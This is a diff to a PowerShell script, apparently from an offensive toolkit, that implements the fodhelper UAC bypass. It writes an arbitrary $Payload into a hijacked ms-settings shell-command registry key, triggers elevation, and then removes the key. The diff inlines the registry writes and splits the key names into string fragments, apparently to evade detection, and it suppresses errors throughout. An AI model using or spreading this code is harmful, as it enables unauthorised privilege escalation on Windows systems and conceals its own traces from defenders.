@@ -108,15 +108,16 @@ param(
 Set-StrictMode -Off
 $ErrorActionPreference = 'SilentlyContinue'
 
-#region ── Core loader (for registry helpers) ────────────────────────────────
-if (-not (Get-Command 'Set-ShellClassCommand' -ErrorAction SilentlyContinue)) {
-    . "$PSScriptRoot\..\Core\Invoke-UACCore.ps1"
-}
-#endregion
-
 #region ── Key setup ─────────────────────────────────────────────────────────
+$xRoot = 'HKCU:\Soft' + 'ware\Cl' + 'asses\'
+$xCls  = 'ms-set' + 'tings'
+$xPath = $xRoot + $xCls + '\Shell\Open\command'
+
 try {
-    Set-ShellClassCommand -ClassKey ('ms-set' + 'tings') -Payload $Payload
+    New-Item -Path $xPath -Force | Out-Null
+    Set-ItemProperty  -Path $xPath -Name '(Default)'       -Value $Payload -Force
+    New-ItemProperty  -Path $xPath -Name 'DelegateExecute' -Value ''       `
+                      -PropertyType String -Force | Out-Null
     Write-Verbose '[FodHelper] Registry key written.'
 }
 catch {
@@ -146,7 +147,7 @@ catch {
     Write-Warning "[FodHelper] Trigger failed: $_"
 }
 finally {
-    Remove-ShellClassKey -ClassKey ('ms-set' + 'tings')
+    Remove-Item -Path ($xRoot + $xCls) -Recurse -Force -ErrorAction SilentlyContinue
     Write-Verbose '[FodHelper] Registry cleanup complete.'
 }
 #endregion
